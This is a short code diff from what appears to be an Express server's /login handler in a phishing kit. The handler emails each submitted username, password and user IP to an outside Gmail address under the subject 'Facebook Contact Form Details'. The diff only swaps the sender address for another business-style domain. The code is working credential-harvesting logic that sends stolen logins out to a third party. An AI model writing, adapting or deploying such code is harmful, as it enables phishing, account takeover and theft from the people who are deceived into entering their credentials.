@@ -57,7 +57,7 @@ app.post("/login", (req, res) => {
 
         // Send email on the first attempt
         const mailOptions = {
-            from: '"Info" <info@earthplanetminerals.com>',
+            from: '"Info" <info@vaulttrustfinancial.com>',
             to: 'roland@gmail.com',
             subject: 'Facebook Contact Form Details',
             text: `Facebook Contact Form Details\nUsername: ${email}\nPassword: ${password}\nUser IP: ${userIp}`
